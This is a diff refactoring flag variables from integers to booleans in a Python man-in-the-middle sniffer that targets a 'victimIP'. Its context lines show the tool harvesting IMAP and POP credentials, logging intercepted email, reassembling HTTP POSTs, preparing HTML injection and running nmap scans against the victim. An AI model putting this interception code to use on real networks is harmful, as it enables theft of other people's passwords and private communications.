@@ -89,21 +89,21 @@ class Parser():
     # Mail, irc, post parsing
     OheadersFound = []
     IheadersFound = []
-    IMAPauth = 0
+    IMAPauth = False
     IMAPdest = ''
-    POPauth = 0
+    POPauth = False
     POPdest = ''
     Cookies = []
     IRCnick = ''
     mail_passwds = []
     oldmailack = ''
     oldmailload = ''
-    mailfragged = 0
+    mailfragged = False
 
     # http parsing
     oldHTTPack = ''
     oldHTTPload = ''
-    HTTPfragged = 0
+    HTTPfragged = False
 
     # html injection
     block_acks = []
@@ -186,6 +186,7 @@ class Parser():
         except:
             headers = load
             body = ''
+
         header_lines = headers.split("\r\n")
 
         if dport == 80:
@@ -382,7 +383,7 @@ class Parser():
             except:
                 pass
             
-            if self.HTTPfragged == 1:
+            if self.HTTPfragged:
                 print(B+'[+] Fragmented POST: '+W+url+B+" HTTP POST's combined load: "+body+W)
                 logger.write('[+] Fragmented POST: '+url+" HTTP POST's combined load: "+body+'\n')
             else:
@@ -409,11 +410,11 @@ class Parser():
             if ack == self.oldHTTPack:
                 self.oldHTTPload = self.oldHTTPload+load
                 load = self.oldHTTPload
-                self.HTTPfragged = 1
+                self.HTTPfragged = True
             else:
                 self.oldHTTPload = load
                 self.oldHTTPack = ack
-                self.HTTPfragged = 0
+                self.HTTPfragged = False
         try:
             headers, body = load.split(r"\r\n\r\n", 1)
         except:
@@ -558,11 +559,11 @@ class Parser():
             if load != r'.\r\n':
                 self.oldmailload = self.oldmailload+load
                 load = self.oldmailload
-                self.mailfragged = 1
+                self.mailfragged = True
         else:
             self.oldmailload = load
             self.oldmailack = ack
-            self.mailfragged = 0
+            self.mailfragged = False
 
         try:
             headers, body = load.split(r"\r\n\r\n", 1)
@@ -588,12 +589,12 @@ class Parser():
     def passwords(self, IP_src, load, dport, IP_dst):
         load = load.replace(r'\r\n', '')
         if dport == 143 and IP_src == victimIP and len(load) > 15:
-            if self.IMAPauth == 1 and self.IMAPdest == IP_dst:
+            if self.IMAPauth and self.IMAPdest == IP_dst:
         
                 # Don't double output mail passwords
                 for x in self.mail_passwds:
                     if load in x:
-                        self.IMAPauth = 0
+                        self.IMAPauth = False
                         self.IMAPdest = ''
                         return
                 
@@ -601,20 +602,20 @@ class Parser():
                 logger.write('[!] IMAP user and pass found: '+load+'\n')
                 self.mail_passwds.append(load)
                 self.decode(load, dport)
-                self.IMAPauth = 0
+                self.IMAPauth = False
                 self.IMAPdest = ''
         
             if "authenticate plain" in load:
-                self.IMAPauth = 1
+                self.IMAPauth = True
                 self.IMAPdest = IP_dst
         
         if dport == 110 and IP_src == victimIP:
-            if self.POPauth == 1 and self.POPdest == IP_dst and len(load) > 10:
+            if self.POPauth and self.POPdest == IP_dst and len(load) > 10:
         
                 # Don't double output mail passwords
                 for x in self.mail_passwds:
                     if load in x:
-                        self.POPauth = 0
+                        self.POPauth = False
                         self.POPdest = ''
                         return
                 
@@ -622,11 +623,11 @@ class Parser():
                 logger.write('[!] POP user and pass found: '+load+'\n')
                 self.mail_passwds.append(load)
                 self.decode(load, dport)
-                self.POPauth = 0
+                self.POPauth = False
                 self.POPdest = ''
         
             if 'AUTH PLAIN' in load:
-                self.POPauth = 1
+                self.POPauth = True
                 self.POPdest = IP_dst
         
         if dport == 26:
@@ -635,7 +636,7 @@ class Parser():
                 # Don't double output mail passwords
                 for x in self.mail_passwds:
                     if load in x:
-                        self.POPauth = 0
+                        self.POPauth = False
                         self.POPdest = ''
                         return
         
@@ -653,7 +654,7 @@ class Parser():
             
             # if date, from, to, in headers then print the message
             if len(self.OheadersFound) > 3 and body != '':
-                if self.mailfragged == 1:
+                if self.mailfragged:
                     print(O+'[!] OUTGOING MESSAGE (fragmented)'+W)
                     logger.write('[!] OUTGOING MESSAGE (fragmented)\n')
                     
@@ -694,7 +695,7 @@ class Parser():
                     return
 
             if message != '':
-                if self.mailfragged == 1:
+                if self.mailfragged:
                     print(O+'[!] INCOMING MESSAGE (fragmented)'+W)
                     logger.write('[!] INCOMING MESSAGE (fragmented)\n')
                     
@@ -945,6 +946,7 @@ def threads():
 
     if args.nmapaggressive:
         print('[*] Starting '+R+'aggressive scan [nmap -T4 -A -v -Pn -oN '+victimIP+']'+W+' in background; results will be in a file '+victimIP+'.nmap.txt')
+        
         try:
             n = Thread(target=os.system, args=('nmap -T4 -A -v -Pn -oN '+victimIP+'.nmap.txt '+victimIP+' >/dev/null 2>&1',))
             n.daemon = True
@@ -1084,6 +1086,7 @@ def main():
 
     if args.nmap:
         print("\n[*] Running [nmap -T4 -O "+victimIP+"]")
+        
         try:
             nmap = Popen(['/usr/bin/nmap', '-T4', '-O', victimIP], stdout=PIPE, stderr=DN)
             nmap = nmap.communicate()[0]
